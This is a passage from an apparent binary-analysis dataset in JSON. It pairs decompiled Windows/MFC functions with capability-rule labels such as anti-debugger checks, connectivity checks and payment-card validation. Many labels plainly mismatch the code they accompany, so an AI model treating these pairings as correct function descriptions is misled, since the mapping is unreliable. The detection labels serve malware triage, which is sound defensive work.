   puVar1 = var_4h;\n    *(iVar2 + 0x10) = *(param_1 + 0x78);\n    if (*(param_1 + 0x8c) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(var_4h, \".HLP\");\n        uVar3 = fcn.00407813(&lpFilename);\n        *(param_1 + 0x8c) = uVar3;\n        *puVar1 = 0;\n    }\n    if (*(param_1 + 0x90) == 0) {\n        (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_108h, \".INI\");\n        uVar3 = fcn.00407813(&var_108h);\n        *(param_1 + 0x90) = uVar3;\n    }\n    return;\n}\n",
        "token_count": 587
    },
    "0041baa2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.0041baa2(char *param_1, int32_t param_2, uint param_3)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    \n    pcVar2 = param_1;\n    for (; *param_1 != '\\0'; param_1 = fcn.0040810f(param_1)) {\n        cVar1 = *param_1;\n        if (((cVar1 == '\\\\') || (cVar1 == '/')) || (cVar1 == ':')) {\n            pcVar2 = fcn.0040810f(param_1);\n        }\n    }\n    if (param_2 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar2);\n        iVar3 = iVar3 + 1;\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(param_2, pcVar2, param_3);\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 232
    },
    "00401ab0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint fcn.00401ab0(void)\n\n{\n    uint arg_8h;\n    uint arg_8h_00;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    \n    arg_8h = fcn.004013a5(0xed306);\n    arg_8h_00 = fcn.004013a5(0xed303);\n    *0x42de10 = fcn.0040140f(arg_8h, 0xa8cf160f);\n    *0x42de14 = fcn.0040140f(arg_8h, 0x94f8ca4);\n    *0x42de18 = fcn.0040140f(arg_8h, 0x73f4acb);\n    *0x42de20 = fcn.0040140f(arg_8h, 0xcf10c35c);\n    *0x42de1c = fcn.0040140f(arg_8h, 0xa430734c);\n    *0x42de24 = fcn.0040140f(arg_8h_00, 0xbbefc84d);\n    *0x42de28 = fcn.0040140f(arg_8h_00, 0xa20d4dcc);\n    *0x42de2c = fcn.0040140f(arg_8h_00, 0x5efdb1c3);\n    return 1;\n}\n",
        "token_count": 328
    },
    "0040e415": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n\ncode ** fcn.0040e415(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_3ch;\n    uint var_20h;\n    uint var_dh;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0xd);\n    fcn.0040cad5(0);\n    uVar1 = fcn.004075e0(\"string too long\");\n    fcn.0040cd2b(\"string too long\", uVar1);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040e46f(unaff_EBP + -0x20);\n    *(unaff_EBP + -0x3c) = vtable.std::length_error.0;\n    fcn.00407fe5(unaff_EBP + -0x3c, 0x421220);\n    fcn.004077f4();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0x41e6f8;\n    fcn.00412b5d(unaff_EBP + -0x10);\n    arg_8h = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = *arg_8h;\n    fcn.0040cad5(0);\n    fcn.0040dfe2(arg_8h, 0, *0x41ed50);\n    uVar1 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::logic_error.0;\n    *in_FS_OFFSET = uVar1;\n    return extraout_ECX;\n}\n",
        "token_count": 452
    },
    "0040e641": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n\nvoid fcn.0040e641(void)\n\n{\n    uint uVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_dh;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x20) = *(unaff_EBP + -0xd);\n    fcn.0040cad5(0);\n    uVar1 = fcn.004075e0(\"invalid string position\");\n    fcn.0040cd2b(\"invalid string position\", uVar1);\n    *(unaff_EBP + -4) = 0;\n    fcn.0040e46f(unaff_EBP + -0x20);\n    arg_8h = unaff_EBP + -0x3c;\n    *(unaff_EBP + -0x3c) = vtable.std::out_of_range.0;\n    fcn.00407fe5(arg_8h, 0x421348);\n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.std::logic_error.0;\n    *(unaff_EBP + -4) = 0;\n    fcn.0040cad5(1, arg_8h, extraout_ECX);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00412be4();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 388
    },
    "004166bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl\nfcn.004166bd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    bool bVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint lpWindowName;\n    uint lpClassName;\n    uint dwExStyle;\n    \n    dwExStyle = arg_8h;\n    lpClassName = arg_ch;\n    lpWindowName = arg_10h;\n    var_10h = arg_14h;\n    var_14h = arg_18h;\n    var_18h = arg_1ch;\n    var_1ch = arg_20h;\n    var_20h = arg_24h;\n    var_24h = arg_28h;\n    var_28h = arg_2ch;\n    iVar1 = fcn.0041ab50();\n    var_2ch = *(iVar1 + 8);\n    var_30h = arg_30h;\n    iVar1 = (**(*in_ECX + 0x5c))(&var_30h);\n    if (iVar1 == 0) {\n        (**(*in_ECX + 0xa4))();\n        bVar3 = false;\n    }\n    else {\n        fcn.0041662f();\n        iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (dwExStyle, lpClassName, lpWindowName, var_10h, var_14h, var_18h, var_1ch, var_20h, var_24h, \n                           var_28h, var_2ch, var_30h);\n        iVar2 = fcn.0041667b();\n        if (iVar2 == 0) {\n            (**(*in_ECX + 0xa4))();\n        }\n        bVar3 = iVar1 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 526
    },
    "00416cb9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00416cb9(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpWndClass;\n    uint var_ah;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffc4;\n    iVar4 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar1 + 0x10), *(iVar1 + 0x24), unaff_EBP + -0x38);\n    if (iVar4 == 0) {\n        iVar3 = (*_sym.imp.USER32.dll_RegisterClassA)(iVar1);\n        if (iVar3 == 0) {\n            uVar5 = 0;\n            goto code_r0x00416d39;\n        }\n        iVar4 = fcn.0041ab50();\n        if (*(iVar4 + 0x14) != '\\0') {\n            fcn.0041b683(1);\n            *(unaff_EBP + -4) = 0;\n            iVar4 = fcn.0041ab50();\n            pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n            (*_sym.imp.KERNEL32.dll_lstrcatA)(iVar4 + 0x34, *(iVar1 + 0x24));\n            *(unaff_EBP + 10) = 10;\n            *(unaff_EBP + 0xb) = 0;\n            (*pcVar2)(iVar4 + 0x34, unaff_EBP + 10);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041b6f3(1);\n        }\n    }\n    uVar5 = 1;\ncode_r0x00416d39:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar5;\n}\n",
        "token_count": 575
    },
    "004142fe": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004142fe(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 == 0xffffffff) {\n        uVar4 = 0;\n        if (*(param_1 + 8) != 0) {\n            ppiVar1 = *(param_1 + 4);\n            do {\n                piVar3 = *ppiVar1;\n                if (piVar3 != NULL) break;\n                uVar4 = uVar4 + 1;\n                ppiVar1 = ppiVar1 + 1;\n            } while (uVar4 < *(param_1 + 8));\n        }\n    }\n    piVar5 = *piVar3;\n    if (piVar5 == NULL) {\n        uVar4 = *(param_1 + 8);\n        uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n        if (uVar2 < uVar4) {\n            ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n            do {\n                piVar5 = *ppiVar1;\n                if (piVar5 != NULL) break;\n                uVar2 = uVar2 + 1;\n                ppiVar1 = ppiVar1 + 1;\n            } while (uVar2 < uVar4);\n        }\n    }\n    *param_2 = piVar5;\n    *param_3 = piVar3[1];\n    *param_4 = piVar3[2];\n    return;\n}\n",
        "token_count": 411
    },
    "00415c3b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415c3b(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.00415a75();\n    if (param_2 == -1) {\n        param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*param_1);\n    }\n    *(*param_1 + -8) = param_2;\n    *(*param_1 + param_2) = 0;\n    return;\n}\n",
        "token_count": 104
    },
    "00419ddd": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00419ddd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_10h_00;\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = *0x42c8a8;\n    *(unaff_EBP + -4) = 0;\n    fcn.004188d7(*(unaff_EBP + 8));\n    arg_10h_00 = *(unaff_EBP + 0x10);\n    if (arg_10h_00 == -1) {\n        arg_10h_00 = *(unaff_EBP + 8);\n    }\n    uVar1 = fcn.00419da5(*(unaff_EBP + -0x10), *(unaff_EBP + 0xc), arg_10h_00);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00415acc();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar1;\n}\n",
        "token_count": 326
    },
    "0041af4f": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041af4f(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    param_1[5] = 0;\n    param_1[6] = 0;\n    param_1[6] = 4;\n    param_1[1] = 0;\n    param_1[2] = 1;\n    param_1[3] = 0;\n    param_1[4] = 0;\n    iVar1 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n    *param_1 = iVar1;\n    if (iVar1 == -1) {\n        fcn.00414000();\n    }\n    (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 + 7);\n    return param_1;\n}\n",
        "token_count": 181
    },
    "0041af91": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041af91(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    \n    if (*param_1 != -1) {\n        (*_sym.imp.KERNEL32.dll_TlsFree)(*param_1);\n    }\n    arg_8h = param_1[5];\n    while (arg_8h != 0) {\n        iVar1 = *(arg_8h + 4);\n        fcn.0041b25d(arg_8h, 0);\n        arg_8h = iVar1;\n    }\n    if (param_1[4] != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GlobalHandle)(param_1[4]);\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)(uVar2);\n        (*_sym.imp.KERNEL32.dll_GlobalFree)(uVar2);\n    }\n    (*_sym.imp.KERNEL32.dll_DeleteCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 231
    },
    "00405fc0": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00405fc0(uint param_1)\n\n{\n    uint32_t uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00405ff0(param_1);\n    if ((uVar1 & 2) != 0) {\n        fcn.00405b60();\n    }\n    return;\n}\n",
        "token_count": 95
    },
    "00418f8c": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nint32_t fcn.00418f8c(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint16_t *puVar3;\n    uint16_t uVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(param_1 + 2) == -1;\n    iVar1 = fcn.00418f36(param_1);\n    if (*(param_1 + 2) == -1) {\n        uVar5 = param_1[3];\n    }\n    else {\n        uVar5 = *param_1;\n    }\n    if ((uVar5 & 0x40) != 0) {\n        iVar1 = iVar1 + ((-bVar6 & 2) + 1) * 2;\n        iVar2 = fcn.00407ea5(iVar1);\n        iVar1 = iVar1 + 2 + iVar2 * 2;\n    }\n    if (bVar6) {\n        uVar4 = *(param_1 + 4);\n    }\n    else {\n        uVar4 = *(param_1 + 2);\n    }\n    if (uVar4 != 0) {\n        uVar5 = uVar4;\n        do {\n            puVar3 = (iVar1 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            uVar4 = *puVar3;\n            if (uVar4 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                while (puVar3 = puVar3 + 1,  uVar4 != 0) {\n                    uVar4 = *puVar3;\n                }\n            }\n            uVar4 = *puVar3;\n            if (uVar4 == 0xffff) {\n                puVar3 = puVar3 + 2;\n            }\n            else {\n                while (puVar3 = puVar3 + 1,  uVar4 != 0) {\n                    uVar4 = *puVar3;\n                }\n            }\n            uVar5 = uVar5 - 1;\n            iVar1 = puVar3 + *puVar3 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar1 - param_1;\n}\n",
        "token_count": 516
    },
    "00419044": {
        "rules": [
            "check for kernel debugger via shared user data structure/3e5f0b53f7994283abe93631eebb775f"
        ],
        "decompiled_code": "\nuint fcn.00419044(uint32_t *param_1, uint param_2, ushort *param_3)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    ushort *puVar3;\n    uint uVar4;\n    \n    if (*(param_1 + 2) == -1) {\n        uVar2 = param_1[3];\n    }\n    else {\n        uVar2 = *param_1;\n    }\n    if ((uVar2 & 0x40) == 0) {\n        return 0;\n    }\n    puVar3 = fcn.00418f36(param_1);\n    *param_3 = *puVar3;\n    iVar1 = *(param_1 + 2);\n    uVar4 = fcn.00415c63(0x20, 0x20, 0, 0);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, puVar3 + ((iVar1 != -1) - 1 & 2) + 1, 0xffffffff, uVar4);\n    fcn.00415c3b(0xffffffff);\n    return 1;\n}\n",
        "token_count": 261
    },
    "00411ed0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint fcn.00411ed0(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint uVar5;\n    uint uVar6;\n    uint32_t uVar7;\n    uint32_t unaff_EBX;\n    uint32_t unaff_EBP;\n    uint32_t unaff_ESI;\n    uint32_t unaff_EDI;\n    uint *puVar8;\n    uint32_t uStack4;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_FindResourceA)(param_1, param_2);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.KERNEL32.dll_SizeofResource)(param_1, iVar1);\n    puVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(param_1, iVar1);\n    if (puVar3 == NULL) {\n        return 0;\n    }\n    puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, uVar2);\n    if (puVar4 == NULL) {\n        return 0;\n    }\n    puVar8 = puVar4;\n    for (uVar7 = uVar2 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    for (uVar2 = uVar2 & 3; uVar2 != 0; uVar2 = uVar2 - 1) {\n        *puVar8 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    puVar4[10] = 0x20000;\n    puVar4[0x11] = (unaff_EDI >> 8 & 0xff) << 8 | unaff_EDI >> 0x10 & 0xff | (unaff_EDI & 0xff) << 0x10;\n    puVar4[0x12] = (unaff_EBP >> 8 & 0xff) << 8 | unaff_EBP >> 0x10 & 0xff | (unaff_EBP & 0xff) << 0x10;\n    puVar4[0x19] = (unaff_ESI >> 8 & 0xff) << 8 | (unaff_ESI & 0xff) << 0x10 | unaff_ESI >> 0x10 & 0xff;\n    puVar4[0x15] = (unaff_EBX >> 8 & 0xff) << 8 | (unaff_EBX & 0xff) << 0x10 | unaff_EBX >> 0x10 & 0xff;\n    puVar4[0x14] = (uStack4 >> 8 & 0xff) << 8 | (uStack4 & 0xff) << 0x10 | uStack4 >> 0x10 & 0xff;\n    uVar5 = (*_sym.imp.USER32.dll_GetDC)(0);\n    uVar6 = (*_sym.imp.GDI32.dll_CreateDIBitmap)(uVar5, puVar4, 4, puVar4 + 0x1a, puVar4, 0);\n    (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar5);\n    (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n    return uVar6;\n}\n",
        "token_count": 815
    },
    "00414922": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint fcn.00414922(int32_t param_1)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((((*(param_1 + 4) == 0x100) && (*(param_1 + 8) == 0x70)) && ((*(param_1 + 0xc) >> 0x10 & 0x4000) == 0)) &&\n       (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x10),  -1 < iVar2 && (iVar2 = (*pcVar1)(0x11),  -1 < iVar2)) &&\n        (iVar2 = (*pcVar1)(0x12),  -1 < iVar2)))) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 189
    },
    "00415af6": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00415af6(uint *param_1, uint32_t param_2)\n\n{\n    int32_t arg_10h;\n    \n    *param_1 = *0x42c8a8;\n    if (param_2 != 0) {\n        if (param_2 >> 0x10 == 0) {\n            fcn.004188d7(param_2 & 0xffff);\n        }\n        else {\n            arg_10h = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_2);\n            if (arg_10h != 0) {\n                fcn.00415957(arg_10h);\n                fcn.00407b70(*param_1, param_2, arg_10h);\n            }\n        }\n    }\n    return param_1;\n}\n",
        "token_count": 181
    },
    "004160af": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t fcn.004160af(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.0041b34f(0x41a53e);\n    uVar2 = (*_sym.imp.USER32.dll_GetMessageTime)();\n    *(iVar1 + 0x44) = uVar2;\n    uVar2 = (*_sym.imp.USER32.dll_GetMessagePos)();\n    *(iVar1 + 0x48) = uVar2;\n    *(iVar1 + 0x4c) = uVar2 >> 0x10;\n    return iVar1 + 0x34;\n}\n",
        "token_count": 141
    },
    "0041625e": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041625e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint hWnd)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_8h;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar4;\n    uint Msg;\n    uint wParam;\n    uint lParam;\n    uint var_10h;\n    uint var_30h;\n    uint var_1ch;\n    uint lpPrevWndFunc;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    \n    fcn.004077f4();\n    uVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = &stack0xffffffb4;\n    uVar1 = (*_sym.imp.USER32.dll_GetPropA)(uVar2, \"AfxOldWndProc423\");\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x18) = uVar1;\n    iVar3 = *(unaff_EBP + 0xc);\n    bVar4 = true;\n    if (iVar3 == 6) {\n        uVar1 = fcn.0041617d(*(unaff_EBP + 0x14));\n        arg_8h = fcn.0041617d(uVar2);\n        fcn.00415ee5(arg_8h, *(unaff_EBP + 0x10), uVar1);\ncode_r0x00416362:\n        if (!bVar4) goto code_r0x004162ef;\n    }\n    else {\n        if (iVar3 == 0x20) {\n            uVar1 = fcn.0041617d(uVar2);\n            iVar3 = fcn.00415f46(uVar1, *(unaff_EBP + 0x14), *(unaff_EBP + 0x14) >> 0x10);\n            bVar4 = iVar3 == 0;\n            goto code_r0x00416362;\n        }\n        if (iVar3 == 0x82) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(uVar2, 0xfffffffc, *(unaff_EBP + -0x18));\n            (*_sym.imp.USER32.dll_RemovePropA)(uVar2, \"AfxOldWndProc423\");\n            uVar1 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(\"AfxOldWndProc423\");\n            (*_sym.imp.KERNEL32.dll_GlobalDeleteAtom)(uVar1);\n        }\n        else if (iVar3 == 0x110) {\n            uVar1 = fcn.0041617d(uVar2);\n            fcn.00415e49(uVar1, unaff_EBP + -0x30, unaff_EBP + -0x1c);\n            uVar2 = (*_sym.imp.USER32.dll_CallWindowProcA)\n                              (*(unaff_EBP + -0x18), uVar2, 0x110, *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n            *(unaff_EBP + -0x14) = uVar2;\n            fcn.00415e6c(uVar1, unaff_EBP + -0x30);\n            goto code_r0x004162ef;\n        }\n    }\n    uVar2 = (*_sym.imp.USER32.dll_CallWindowProcA)\n                      (*(unaff_EBP + -0x18), uVar2, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    *(unaff_EBP + -0x14) = uVar2;\ncode_r0x004162ef:\n    uVar2 = *(unaff_EBP + -0x14);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 1001
    },
    "00417929": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00417929(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t *var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h < 0x112) {\n        if (arg_8h == 0x111) {\n            iVar2 = fcn.00414c5e(0, arg_ch >> 0x10 | 0xbd110000, 0, 0);\n            if (iVar2 == 0) {\n                return 0;\n            }\n            if (arg_14h != NULL) {\n                *arg_14h = 1;\n                return 1;\n            }\n            return 1;\n        }\n        if (0x2a < arg_8h) {\n            if ((arg_8h < 0x30) || (arg_8h == 0x39)) goto code_r0x004179bd;\n            if (arg_8h == 0x4e) {\n                var_8h = arg_14h;\n                var_4h = arg_10h;\n                uVar1 = fcn.00414c5e(0, *(arg_10h + 8) & 0xffff | 0xbc4e0000, &var_8h, 0);\n                return uVar1;\n            }\n        }\n    }\n    else if ((0x113 < arg_8h) && ((arg_8h < 0x116 || (arg_8h == 0x210)))) {\ncode_r0x004179bd:\n        uVar1 = fcn.00416f0c(arg_8h + 0xbc00, arg_ch, arg_10h, arg_14h);\n        return uVar1;\n    }\n    if ((0x131 < arg_8h) && (arg_8h < 0x139)) {\n        var_4h = arg_8h - 0x132;\n        var_8h = arg_ch;\n        uVar1 = fcn.00416f0c(0xbc19, 0, &var_ch, arg_14h);\n        if (*arg_14h != 0) {\n            return uVar1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 536
    },
    "0041a5d2": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.0041a5d2(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint lpvBits;\n    int32_t nHeight;\n    int32_t var_8h;\n    uint8_t *var_4h;\n    \n    uVar2 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n    iVar5 = uVar2;\n    nHeight = uVar2 >> 0x10;\n    if (0x20 < iVar5) {\n        iVar5 = 0x20;\n    }\n    iVar6 = iVar5 + 0xf >> 4;\n    iVar7 = ((iVar5 + -4) / 2 + iVar6 * 0x10) - iVar5;\n    if (0xc < iVar7) {\n        iVar7 = 0xc;\n    }\n    if (0x20 < nHeight) {\n        nHeight = 0x20;\n    }\n    fcn.004079b0(&lpvBits, 0xff, 0x80);\n    var_4h = 0x41d99c;\n    var_8h = 5;\n    puVar4 = &lpvBits + (nHeight + -6 >> 1) * iVar6 * 2;\n    do {\n        uVar1 = *var_4h;\n        uVar3 = var_4h & 0xffff0000;\n        var_4h = var_4h + 1;\n        uVar3 = ~((uVar3 | uVar1) << (iVar7 & 0x1f));\n        puVar4[1] = uVar3;\n        *puVar4 = uVar3 >> 8;\n        puVar4 = puVar4 + iVar6 * 2;\n        var_8h = var_8h + -1;\n    } while (var_8h != 0);\n    *0x42fdd0 = (*_sym.imp.GDI32.dll_CreateBitmap)(iVar5, nHeight, 1, 1, &lpvBits);\n    if (*0x42fdd0 == 0) {\n        *0x42fdd0 = (*_sym.imp.USER32.dll_LoadBitmapA)(0, 0x7fe3);\n    }\n    return;\n}\n",
        "token_count": 535
    },
    "0040e950": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
